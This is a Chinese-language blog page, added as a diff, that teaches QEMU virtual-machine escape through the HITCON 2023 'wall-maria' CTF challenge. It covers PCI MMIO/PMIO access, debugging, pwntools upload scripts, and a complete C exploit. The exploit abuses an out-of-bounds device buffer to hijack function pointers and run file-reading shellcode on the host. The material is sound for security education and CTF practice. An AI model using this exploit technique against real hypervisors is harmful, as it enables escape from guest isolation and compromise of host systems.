@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【Virtual】浅谈escape-qemu
+        </div>
+        <div class="post-meta">
+            2023-09-19
+        </div>
+        <div class="post-md">
+            <blockquote>
+<p>qemu逃逸这部分内容，在今年年初就有所涉猎，然而由于本人过于懒惰，这个部分的总结推了整整半年多。直到参加本月的HTICON2023，真正第一次在比赛中面对QEMU逃逸，发现了自己很多的不足之处。借这次机会将这部分内容作以总结。</p>
+</blockquote>
+<p><img src="/img/article/escape-qemu/image-20230504161002653.png" alt="QEMU"></p>
+<h2 id="PCI设备"><a href="#PCI设备" class="headerlink" title="PCI设备"></a>PCI设备</h2><p>在目前的QEMU逃逸题目类型中，出题者一般会在<code>qemu-system-x86_64</code>(或是对应arm架构的qemu-system)的二进制程序中加入自己编写的、具有漏洞的PCI设备模块。每个PCI设备都对应一个PCI配置空间，包含该PCI设备的相关信息，结构如图。</p>
+<p><img src="/img/article/escape-qemu/v2-c24106f5fc7def1902147bc6ff723ab8_1440w.webp" alt="PCI"></p>
+<p>针对PCI设备，其对应内存空间有两种形式，MMIO和PMIO</p>
+<h3 id="MMIO-内存映射I-x2F-O"><a href="#MMIO-内存映射I-x2F-O" class="headerlink" title="MMIO 内存映射I&#x2F;O"></a>MMIO 内存映射I&#x2F;O</h3><p>MMIO全称位Memory mapping I&#x2F;O，即内存映射I&#x2F;O. 直观来讲，就是内存和I&#x2F;O共享一个地址空间。在计算机组成原理中，我们也接触过这样的形式：直接将一部分内存地址空间分配于外设，访问外设和代码数据使用相同的地址总线。</p>
+<p><img src="/img/article/escape-qemu/1094457-20171019111628396-1048214045.png" alt="MMIO"></p>
+<p>因此访问这种外设的I&#x2F;O非常方便，因为在同一地址空间下，我们只需要直接访问映射出来的虚拟地址空间即可，对于MMIO型设备，我们可以用如下的方式访问</p>
+<pre><code class="c">char* mmio_mem;
+ 
+void mmio_write(uint64_t addr, char value) &#123;
+    *(char*)(mmio_mem + addr) = value;
+&#125;
+ 
+uint64_t mmio_read(uint64_t addr) &#123;
+    return *((char *)(mmio_mem + addr));
+&#125;
+int main()
+&#123;
+    // 这里具体打开那个pci设备需要定位，后几节我们会谈到
+    int fd = open(&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;,O_RDWR | O_SYNC);
+    if (fd == -1)
+    &#123;
+      perror(&quot;mmio_fd open failed&quot;);
+        exit(-1);
+    &#125;
+    
+    /*	映射外设I/O	*/
+    mmio_mem = mmap(0,0x1000,PROT_READ | PROT_WRITE, MAP_SHARED,fd,0);
+    if (mmio_mem == MAP_FAILED)
+    &#123;
+      perror(&quot;mmap mmio_mem failed&quot;);
+            exit(-1);
+    &#125;
+&#125;
+</code></pre>
+<h3 id="PMIO-端口映射I-x2F-O"><a href="#PMIO-端口映射I-x2F-O" class="headerlink" title="PMIO 端口映射I&#x2F;O"></a>PMIO 端口映射I&#x2F;O</h3><p>PMIO全称为Port-mapped I&#x2F;O，即端口映射I&#x2F;O，也被称为隔离的I&#x2F;O（isolated I&#x2F;O）。在这种外设内存分配形式下，外设拥有独立的地址空间，因而在物理接口层面一般会有独立的I&#x2F;O总线或I&#x2F;O引脚来对这种外设进行访问。</p>
+<p><img src="/img/article/escape-qemu/1094457-20171019112241084-1805450176.png" alt="PMIO"></p>
+<p>在这种情况下，端口映射I&#x2F;O需要特殊的指令来进行I&#x2F;O操作。在intel微处理器下，一般使用IN和OUT来进行I&#x2F;O操作。例如：inb, inw, inl, outb, outw, outl等，用于读写不同长度，b代表byte，w代表word，l代表long。访问方式如下</p>
+<pre><code class="c">int pmio_base = 0xc040;
+void pmio_write(uint32_t addr, uint32_t value)
+&#123;
+    outl(value, pmio_base + addr);
+&#125;
+ 
+uint64_t pmio_read(uint32_t addr)
+&#123;
+    return inl(pmio_base + addr);
+&#125;
+int main(int argc, char *argv[])
+&#123;
+ 
+    // Open and map I/O memory for the strng device
+    if (iopl(3) !=0 )&#123;
+        perror(&quot;I/O permission is not enough&quot;);
+                exit(-1);
+                &#125;
+&#125;
+</code></pre>
+<h3 id="查看系统PCI设备"><a href="#查看系统PCI设备" class="headerlink" title="查看系统PCI设备"></a>查看系统PCI设备</h3><p>主要可以使用两个命令<code>lspci</code>和<code>info pci</code></p>
+<h4 id="lspci"><a href="#lspci" class="headerlink" title="lspci"></a>lspci</h4><p>在linux环境下我们可以使用命令<code>lspci</code>来列出该系统装载的的所有pci设备</p>
+<pre><code class="bash">/root # lspci
+00:01.0 Class 0601: 8086:7000
+00:04.0 Class 0200: 8086:100e
+00:00.0 Class 0600: 8086:1237
+00:01.3 Class 0680: 8086:7113
+00:03.0 Class 0200: 8086:100e
+00:01.1 Class 0101: 8086:7010
+00:02.0 Class 0300: 1234:1111
+00:05.0 Class 00ff: 1234:dead
+/root # 
+</code></pre>
+<p>以第5行<code>00:05.0 Class 00ff: 1234:dead</code>为例，来介绍每个部分含义，从左向右具体内容指代如下:</p>
+<ul>
+<li><code>00</code>代表总线标号</li>
+<li><code>05.0</code>，其中<code>05</code>代表设备号，<code>.0</code>用来表示功能号</li>
+<li><code>00ff</code>，class_id</li>
+<li><code>1234</code>，vendor_id</li>
+<li><code>dead</code>，device_id</li>
+</ul>
+<p>一般通过后三个内容信息，我们便可知道要找的PCI设备对应哪一个内容.</p>
+<h4 id="info-pci"><a href="#info-pci" class="headerlink" title="info pci"></a>info pci</h4><p>在没用lspci命令的情况下，我们也可以使用<code>info pci</code>命令查看，不过其为QEMU的monitor所包含的指令。</p>
+<p>首先要修改<code>run.sh</code>，在结尾部分添加monitor选项<code>-monitor telnet:127.0.0.1:4444,server,nowait</code></p>
+<pre><code class="sh">#!/bin/bash
+
+./qemu-system-x86_64 \
+    -L ./bios \
+    -kernel ./bzImage \
+    -initrd ./rootfs.cpio \
+    -cpu kvm64,+smep,+smap \
+    -monitor none \
+    -m 1024M \
+    -append &quot;console=ttyS0 oops=panic panic=1 quiet&quot; \
+    -monitor /dev/null \
+    -nographic \
+    -no-reboot \
+    -net user -net nic -device e1000 \
+    -device maria \
+    -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny \
+    -monitor telnet:127.0.0.1:4444,server,nowait
+</code></pre>
+<p>之后我们便可以使用<code>nc</code>或者<code>telnet</code>进行连接</p>
+<pre><code class="sh">┌─[loorain@ubuntu] - [~/PWN/hitcon/2023/wall_maria/share] - [5120]
+└─[$] nc 127.0.0.1 4444                                                                       [10:18:44]
+QEMU 8.0.2 monitor - type &#39;help&#39; for more information
+(qemu) info pci
+info pci
+  Bus  0, device   0, function 0:
+    Host bridge: PCI device 8086:1237
+      PCI subsystem 1af4:1100
+      id &quot;&quot;
+  Bus  0, device   1, function 0:
+    ISA bridge: PCI device 8086:7000
+      PCI subsystem 1af4:1100
+      id &quot;&quot;
+  Bus  0, device   1, function 1:
+    IDE controller: PCI device 8086:7010
+      PCI subsystem 1af4:1100
+      BAR4: I/O at 0xc080 [0xc08f].
+      id &quot;&quot;
+  Bus  0, device   1, function 3:
+    Bridge: PCI device 8086:7113
+      PCI subsystem 1af4:1100
+      IRQ 9, pin A
+      id &quot;&quot;
+  Bus  0, device   2, function 0:
+    VGA controller: PCI device 1234:1111
+      PCI subsystem 1af4:1100
+      BAR0: 32 bit prefetchable memory at 0xfd000000 [0xfdffffff].
+      BAR2: 32 bit memory at 0xfebe0000 [0xfebe0fff].
+      BAR6: 32 bit memory at 0xffffffffffffffff [0x0000fffe].
+      id &quot;&quot;
+  Bus  0, device   3, function 0:
+    Ethernet controller: PCI device 8086:100e
+      PCI subsystem 1af4:1100
+      IRQ 11, pin A
+      BAR0: 32 bit memory at 0xfeb80000 [0xfeb9ffff].
+      BAR1: I/O at 0xc000 [0xc03f].
+      BAR6: 32 bit memory at 0xffffffffffffffff [0x0003fffe].
+      id &quot;&quot;
+  Bus  0, device   4, function 0:
+    Ethernet controller: PCI device 8086:100e
+      PCI subsystem 1af4:1100
+      IRQ 11, pin A
+      BAR0: 32 bit memory at 0xfeba0000 [0xfebbffff].
+      BAR1: I/O at 0xc040 [0xc07f].
+      BAR6: 32 bit memory at 0xffffffffffffffff [0x0003fffe].
+      id &quot;&quot;
+  Bus  0, device   5, function 0:
+    Class 0255: PCI device 1234:dead
+      PCI subsystem 1af4:1100
+      BAR0: 32 bit memory at 0xfebd0000 [0xfebdffff].
+      id &quot;&quot;
+(qemu) 
+</code></pre>
+<p>可以看到，其给出了更加详细PCI设备内容</p>
+<h2 id="调试QEMU"><a href="#调试QEMU" class="headerlink" title="调试QEMU"></a>调试QEMU</h2><p>QEMU逃逸本质上可以回归为用户态的漏洞利用问题，以为实际情况便是劫持在宿主机上运行的<code>qemu-system</code>程序实现宿主机RCE，之后通过反弹shell或者其他操作便完成了一个QEMU逃逸。</p>
+<p>因此调试QEMU的方式，便是直接attach到<code>qemu-system</code>进程，具体流程如下</p>
+<p>首先找到<code>qemu-system</code> 的进程号,可以使用<code>ps -aux | grep &quot;qemu-system&quot;</code></p>
+<pre><code class="sh">┌─[loorain@ubuntu] - [~/PWN/hitcon/2023/wall_maria/share] - [5128]
+└─[$] ps -aux | grep &quot;qemu-system&quot;                                                            [10:55:39]
+loorain    11957 18.4  5.8 3405144 469648 pts/0  Sl+  10:55   0:33 ./qemu-system-x86_64 -L ./bios -kernel ./bzImage -initrd ./rootfs.cpio -cpu kvm64,+smep,+smap -monitor none -m 1024M -append console=ttyS0 oops=panic panic=1 quiet -monitor /dev/null -nographic -no-reboot -net user -net nic -device e1000 -device maria -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny -monitor telnet:127.0.0.1:4444,server,nowait
+loorain    12232  0.0  0.0   9208  2432 pts/5    S+   10:58   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox qemu-system
+┌─[loorain@ubuntu] - [~/PWN/hitcon/2023/wall_maria/share] - [5130]
+└─[$]  
+</code></pre>
+<p>然后需要用root权限直接gdb qemu-system，之后attach到该进程</p>
+<pre><code class="sh">┌─[loorain@ubuntu] - [~/PWN/hitcon/2023/wall_maria/share] - [5132]
+└─[$] sudo gdb qemu-system-x86_64                                                             [10:59:14]
+[sudo] password for loorain: 
+GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
+...
+...
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...
+pwndbg: loaded 198 commands. Type pwndbg [filter] for a list.
+pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+Reading symbols from qemu-system-x86_64...
+pwndbg&gt; attach 11957
+</code></pre>
+<p>剩下就是下断点以及调试了</p>
+<h2 id="远程exp脚本"><a href="#远程exp脚本" class="headerlink" title="远程exp脚本"></a>远程exp脚本</h2><p>这部分偷的wjh师傅的exp模板，Kernel和QEMU逃逸类型题目都是通用的，也可以更具自己需求自定义内容。</p>
+<blockquote>
+<p>根据我自己的经验，有时候gcc生成的静态链接程序过于庞大，pwntools可能会出现传输卡死的情况发生。这个时候可以考虑用musl-gcc静态编译exp文件，体积一般能直接缩小到1&#x2F;3的大小，再配合gzip压缩，传输效果嘎嘎好👌</p>
+</blockquote>
+<p><strong>上传脚本1（一次性发送）</strong></p>
+<pre><code class="python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+import os
+
+# context.log_level = &#39;debug&#39;
+cmd = &#39;# &#39;
+
+
+def exploit(r):
+    r.sendlineafter(cmd, &#39;stty -echo&#39;)
+    os.system(&#39;musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp&#39;)
+    os.system(&#39;gzip -c ./poc/exp &gt; ./poc/exp.gz&#39;)
+    r.sendlineafter(cmd, &#39;cat &lt;&lt;EOF &gt; exp.gz.b64&#39;)
+    r.sendline((read(&#39;./poc/exp.gz&#39;)).encode(&#39;base64&#39;))
+    r.sendline(&#39;EOF&#39;)
+    r.sendlineafter(cmd, &#39;base64 -d exp.gz.b64 &gt; exp.gz&#39;)
+    r.sendlineafter(cmd, &#39;gunzip ./exp.gz&#39;)
+    r.sendlineafter(cmd, &#39;chmod +x ./exp&#39;)
+    r.sendlineafter(cmd, &#39;./exp&#39;)
+    r.interactive()
+
+
+# p = process(&#39;./startvm.sh&#39;, shell=True)
+p = remote(&#39;nc.eonew.cn&#39;,10100)
+
+exploit(p)
+</code></pre>
+<p><strong>上传脚本2（分段发送）</strong></p>
+<pre><code class="python">#coding:utf8
+from pwn import *
+import base64
+context.log_level = &#39;debug&#39;
+os.system(&quot;musl-gcc 1.c -o exp --static&quot;)
+sh = remote(&#39;127.0.0.1&#39;,5555)
+
+f = open(&#39;./exp&#39;,&#39;rb&#39;)
+content = f.read()
+total = len(content)
+f.close()
+per_length = 0x200;
+sh.sendlineafter(&#39;# &#39;,&#39;touch /tmp/exploit&#39;)
+for i in range(0,total,per_length):
+   bstr = base64.b64encode(content[i:i+per_length])
+   sh.sendlineafter(&#39;# &#39;,&#39;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#39;.format(bstr))
+if total - i &gt; 0:
+   bstr = base64.b64encode(content[total-i:total])
+   sh.sendlineafter(&#39;# &#39;,&#39;echo &#123;&#125; | base64 -d &gt;&gt; /tmp/exploit&#39;.format(bstr))
+
+sh.sendlineafter(&#39;# &#39;,&#39;chmod +x /tmp/exploit&#39;)
+sh.sendlineafter(&#39;# &#39;,&#39;/tmp/exploit&#39;)
+sh.interactive()
+</code></pre>
+<h2 id="实战练习"><a href="#实战练习" class="headerlink" title="实战练习"></a>实战练习</h2><blockquote>
+<p>这里我选用的题目是HITCON2023 wall-maria，算是比赛pwn方向的签到题，难度比较适合做qemu入门</p>
+<p>题目可以在这里下载：<a target="_blank" rel="noopener" href="https://github.com/wxrdnx/HITCON-2023-Challenges">wxrdnx&#x2F;HITCON-2023-Challenges (github.com)</a></p>
+</blockquote>
+<p>改题目甚至直接给了maria设备的相关源码，最大程度降低了题目难度，不过我们还是从逆向开始分析，尽可能介绍这类题目的完整流程</p>
+<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>直接将给予我们的<code>qemu-system-x86_64</code>拖入IDA中，要找到我们需要的PCI设备相关函数，首先要知道设备名称。一般从启动脚本或是题目名称中可以得到相关信息，比如本题的启动脚本中包含<code>-device maria</code></p>
+<p>我们便可以在IDA的函数中搜索关键词<code>maria</code>，可以得到如下结果</p>
+<p><img src="/img/article/escape-qemu/image-20230919112547611.png" alt="image-20230919112547611"></p>
+<p>函数名称一般就能够直观表示功能，比如使用MMIO进行读写操作的函数，还有初始化函数相关的内容。</p>
+<h4 id="maria-class-init"><a href="#maria-class-init" class="headerlink" title="maria_class_init"></a>maria_class_init</h4><p>首先我们来看看初始化相关的函数，进入<code>maria_class_init</code>，可以看到如下内容</p>
+<p><img src="/img/article/escape-qemu/image-20230919121939263.png" alt="image-20230919121939263"></p>
+<p>这里比较明显的设置了该设备的一些信息，比如<code>vendor_id</code>, <code>device_id</code>, <code>class_id</code>等等。对应<code>lspci</code>得到的内容我们可以确定设备对应<code>00:05.0 Class 00ff: 1234:dead</code>这一行</p>
+<p><img src="/img/article/escape-qemu/image-20230919124121210.png" alt="image-20230919124121210"></p>
+<h4 id="maria-mmio-read-amp-write"><a href="#maria-mmio-read-amp-write" class="headerlink" title="maria_mmio_read &amp; write"></a>maria_mmio_read &amp; write</h4><p>接下来我们需要看看核心的读写函数，由函数名，我们可以得到信息这两个函数的调用需要使用mmio的方式。为了让逆向代码可读性更好，我们需要将函数的第一个参数设置为对应的结构体类型(一般结构体的名称与设备名称相关，可以用关键词搜索)</p>
+<p>右键指针类型，选择 <code>Convert to struct *...</code></p>
+<p><img src="/img/article/escape-qemu/image-20230919124457514.png" alt="image-20230919124457514"></p>
+<p>然后关键词搜索maria，设置对应类型。对write函数也进行同样的操作</p>
+<p><img src="/img/article/escape-qemu/image-20230919124558959.png" alt="image-20230919124558959"></p>
+<p>我们就能得到相对直观的伪代码，下图是<code>mmio_read</code>和<code>mmio_write</code></p>
+<p><img src="/img/article/escape-qemu/image-20230919124650300.png" alt="read函数"></p>
+<p><img src="/img/article/escape-qemu/image-20230919124738617.png" alt="image-20230919124738617"></p>
+<h4 id="cpu-physical-memory"><a href="#cpu-physical-memory" class="headerlink" title="cpu_physical_memory"></a>cpu_physical_memory</h4><p>我们注意到read和write使用<code>cpu_physical_memory_rw()</code>来进行内存读写操作，需要注意的是，该函数用于<strong>物理内存的读写</strong>。因而我们需要对虚拟内存进行转换，这里我们先来关注下该函数的原型和使用方式</p>
+<pre><code class="c">void __cdecl cpu_physical_memory_rw(hwaddr addr, void *buf, hwaddr len, bool is_write) &#123;&#125;;
+/*
+*	函数简介：
+*		该函数主要用于物理内存之间的数据读写：当is_write为0时，由addr拷贝
+*		至buf；当is_write为1时，由buf拷贝至addr。
+*	参数含义：
+*		hwaddr addr 	表示客户机的物理地址，例如QEMU中我们的EXP程序；
+*		void* buf 		表示QEMU本身的虚拟地址，例如qemu-system-x86_64；
+*		hwaddr len		表示读写长度；
+*		bool is_write	函数功能控制参数，解释如上简介。
+*/
+</code></pre>
+<h3 id="漏洞分析及利用"><a href="#漏洞分析及利用" class="headerlink" title="漏洞分析及利用"></a>漏洞分析及利用</h3><p>这里的漏洞比较直观，主要是由于读写时的长度固定为0x2000，在设置偏移<code>off</code>之后，便会导致越界读写。根据我个人调试的结果，成员变量<code>src</code>具结构体开头的偏移0xa20，<code>off</code>为偏移0xa28，<code>buff</code>偏移为0xa30，结构体定义如下：</p>
+<pre><code class="c">typedef struct &#123;
+    PCIDevice pdev;
+    struct &#123;
+        uint64_t src;
+        uint8_t off;
+    &#125; state;
+    char buff[BUFF_SIZE];
+    MemoryRegion mmio;
+&#125; MariaState;
+</code></pre>
+<p>可以看到越界读写便会读取结构体<code>MemoryRegion</code>中的内容，里面有相当多的指针，具体我们会在后面介绍</p>
+<p>因此基本利用思路如下：</p>
+<ol>
+<li>利用越界读写，获得<code>qemu-system-x86_64</code> 所在虚拟内存的堆地址指针和text段地址指针</li>
+<li>覆盖<code>mmio-&gt;ops</code>, <code>mmio-&gt;opaque</code>指针至合适的位置</li>
+<li>覆盖<code>mmio_read</code>和<code>mmio_write</code>以劫持控制流</li>
+</ol>
+<h4 id="Linux-Huge-Page"><a href="#Linux-Huge-Page" class="headerlink" title="Linux Huge Page"></a>Linux Huge Page</h4><p> 这里读写前需要考虑一个问题，内存读写的大小为0x2000，刚刚好是两个页面；同时又使用进程物理地址获取信息。所以我们还需要保证exp中的buf[0x2000]对应两个恰好连续的物理页面。这里解决方案使用的便是Linux Huge Page的方式，来扩大页表大小。</p>
+<p> 在申请buf前，使用如下方式开启Linux Huge Page</p>
+<pre><code class="c">system(&quot;sysctl vm.nr_hugepages=32&quot;);
+system(&quot;cat /proc/meminfo | grep -i huge&quot;);
+</code></pre>
+<blockquote>
+<p> 具体介绍可以我之前的博客：<a href="https://loora1n.github.io/2023/09/11/%E3%80%90Kernel%E3%80%91Linux%20Huge%20Pages/">Linux Huge Pages</a></p>
+</blockquote>
+<h4 id="MemoryRegion"><a href="#MemoryRegion" class="headerlink" title="MemoryRegion"></a>MemoryRegion</h4><p><code>MemoryRegion</code>结构体定义如下，我们可以找到<code>ops</code>和<code>opague</code>相对于该结构体起始地址的偏移为0x48和0x50</p>
+<pre><code class="c">struct MemoryRegion &#123;
+    Object parent_obj;
+
+    /* private: */
+
+    /* The following fields should fit in a cache line */
+    bool romd_mode;
+    bool ram;
+    bool subpage;
+    bool readonly; /* For RAM regions */
+    bool nonvolatile;
+    bool rom_device;
+    bool flush_coalesced_mmio;
+    uint8_t dirty_log_mask;
+    bool is_iommu;
+    RAMBlock *ram_block;
+    Object *owner;
+    /* owner as TYPE_DEVICE. Used for re-entrancy checks in MR access hotpath */
+    DeviceState *dev;
+
+    const MemoryRegionOps *ops;
+    void *opaque;
+    MemoryRegion *container;
+    int mapped_via_alias; /* Mapped via an alias, container might be NULL */
+    Int128 size;
+    hwaddr addr;
+    void (*destructor)(MemoryRegion *mr);
+    uint64_t align;
+    bool terminates;
+    bool ram_device;
+    bool enabled;
+    bool warning_printed; /* For reservations */
+    uint8_t vga_logging_count;
+    MemoryRegion *alias;
+    hwaddr alias_offset;
+    int32_t priority;
+    QTAILQ_HEAD(, MemoryRegion) subregions;
+    QTAILQ_ENTRY(MemoryRegion) subregions_link;
+    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;
+    const char *name;
+    unsigned ioeventfd_nb;
+    MemoryRegionIoeventfd *ioeventfds;
+    RamDiscardManager *rdm; /* Only for RAM */
+
+    /* For devices designed to perform re-entrant IO into their own IO MRs */
+    bool disable_reentrancy_guard;
+&#125;;
+</code></pre>
+<p>需要知道的是<code>opaque</code>即mmio函数的第一个参数，也就是指向PCI对应结构体的起始地址；<code>ops</code>指向一个虚表，用于存放该PCI设备对应的一些函数，如下图</p>
+<p><img src="/img/article/escape-qemu/image-20230919142406536.png" alt="image-20230919142406536"></p>
+<p><code>ops</code>指向的第一个函数为read，第二个函数为write；对于本题存在沙盒，我们只需要劫持虚表指针，覆盖<code>maria_mmio_read</code>为<code>mprotect</code>，<code>maria_mmio_write</code>为shellcode即可。</p>
+<p>函数参数rdi可以通过越界覆盖opaque指针完成，其他参数也可以直接控制，参考exp如下:</p>
+<pre><code class="c">/*
+*   escape-qemu template for mimo PCI device
+*   By Loora1N
+*/
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/io.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;inttypes.h&gt;
+
+unsigned char *mmio_mem;
+
+#define PAGE_SIZE 0x1000
+
+void mmio_write(uint32_t addr, uint32_t value) &#123;
+    *(uint32_t *)(mmio_mem + addr) = value;
+&#125;
+
+uint32_t mmio_read(uint32_t addr) &#123;
+    return *(uint32_t *)(mmio_mem + addr);
+&#125;
+
+void set_src(uint32_t value) &#123;
+    mmio_write(0x04, value);
+&#125;
+
+void set_off(uint32_t value) &#123;
+    mmio_write(0x08, value);
+&#125;
+
+void get_buff() &#123;
+    mmio_read(0x00);
+&#125;
+
+void set_buff() &#123;
+    mmio_write(0x00, 0);
+&#125;
+
+uint64_t gva2gpa(void *addr)&#123;
+    uint64_t page = 0;
+    int fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY);
+    if (fd &lt; 0) &#123;
+        fprintf(stderr, &quot;[!] open error in gva2gpa\n&quot;);
+        exit(1);
+    &#125;
+    lseek(fd, ((uint64_t)addr / PAGE_SIZE) * 8, SEEK_SET);
+    read(fd, &amp;page, 8);
+    return ((page &amp; 0x7fffffffffffff) * PAGE_SIZE) | ((uint64_t)addr &amp; 0xfff);
+&#125;
+
+int main() &#123;
+    
+    //init
+
+    int mmio_fd = open(&quot;/sys/devices/pci0000:00/0000:00:05.0/resource0&quot;, O_RDWR | O_SYNC);
+    if (mmio_fd == -1) &#123;
+        fprintf(stderr, &quot;[!] Cannot open /sys/devices/pci0000:00/0000:00:05.0/resource0\n&quot;);
+        exit(1);
+    &#125;
+    mmio_mem = mmap(NULL, 4 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
+    if (mmio_mem == MAP_FAILED) &#123;
+        fprintf(stderr, &quot;[!] mmio error\n&quot;);
+        exit(1);
+    &#125;
+    printf(&quot;[*] mmio done\n&quot;);
+
+
+    //set huge pages
+    system(&quot;sysctl vm.nr_hugepages=32&quot;);
+    system(&quot;cat /proc/meminfo | grep -i huge&quot;);
+
+    //寻址物理地址相邻的页
+    char* buff;
+    uint64_t buff_gpa;
+    while(1)&#123;
+        buff = (char *)mmap(NULL, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+        if(buff == MAP_FAILED) &#123;
+            fprintf(stderr, &quot;[!] cannot mmap buff\n&quot;);
+        &#125;
+        memset(buff, 0x0, 2 * PAGE_SIZE);
+        buff_gpa = gva2gpa(buff);
+
+        uint64_t buff_gpa_1000 = gva2gpa(buff + PAGE_SIZE);
+        if(buff_gpa + PAGE_SIZE == buff_gpa_1000) &#123;
+            break;
+        &#125;
+    &#125;
+    
+    printf(&quot;[*] buff virtual address = %p\n&quot;,buff);
+    printf(&quot;[*] buff physical address = %p\n&quot;,buff_gpa);
+
+    set_src(buff_gpa);
+    set_off(0xf0);
+    get_buff();
+
+    uint64_t * buff_u64 = (uint64_t *) buff;
+    uint64_t maria_buff_addr = buff_u64[0x3fa] - 0x20b8;
+    uint64_t maria_addr = maria_buff_addr - 0xa30;
+    uint64_t qemu_code_base = buff_u64[0x3eb] - 0xf1ff80;
+    uint64_t mprotect_plt = qemu_code_base + 0x30C404;
+
+    printf(&quot;[*] maria buff addr = %p\n&quot;,maria_buff_addr);
+    printf(&quot;[*] maria addr = %p\n&quot;,maria_addr);
+    printf(&quot;[*] qemu_code_base = %p\n&quot;,qemu_code_base);
+    printf(&quot;[*] mprotect_plt = %p\n&quot;,mprotect_plt);
+    
+    
+    /* orw shellcode*/
+    char shellcode[] = &#123;
+        0xeb, 0x10, 0x2f, 0x68, 0x6f, 0x6d, 0x65, 0x2f, 0x75, 0x73, 0x65, 0x72,
+        0x2f, 0x66, 0x6c, 0x61, 0x67, 0x00, 0x6a, 0x02, 0x58, 0x48, 0x8d, 0x3d,
+        0xe6, 0xff, 0xff, 0xff, 0x31, 0xf6, 0x0f, 0x05, 0x48, 0x97, 0x31, 0xc0,
+        0x54, 0x5e, 0x6a, 0x70, 0x5a, 0x0f, 0x05, 0x48, 0x92, 0x6a, 0x01, 0x58,
+        0x6a, 0x01, 0x5f, 0x54, 0x5e, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x6a, 0x3c,
+        0x58, 0x0f, 0x05
+    &#125;;
+    
+    buff_u64[0x0] = maria_buff_addr + 0x4f0;    // overwirte mmio_read to shellcode
+    buff_u64[0x1] = mprotect_plt;               // overwrite mmio_write to mprotect
+
+    memcpy(&amp;buff_u64[0x80],shellcode,sizeof(shellcode));
+
+    //覆盖 maria-&gt;mmio.ops and maria-&gt;mmio.opaque
+    buff_u64[0x3ec] = maria_buff_addr &amp; ~0xfff;     // maria-&gt;mmio.opaque 控制rdi
+    buff_u64[0x3eb] = maria_buff_addr + 0xf0;       // maria-&gt;mmio.ops 覆盖虚表
+    buff_u64[0x3eb - (maria_addr &amp; 0xfff) / 8] = maria_buff_addr + 0xf0; // (MariaState *)(maria_addr &amp; 0xfff)-&gt;mmio.ops 控制rdi所对应的虚表
+
+    set_src(buff_gpa);
+    set_off(0xf0);
+    set_buff();
+    
+    mmio_write(0x2000, 0x7); // mprotect(maria_buff_addr &amp; ~0xfff, 0x2000, 0x7)
+    mmio_read(0x0);
+    return 0;
+&#125;
+</code></pre>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
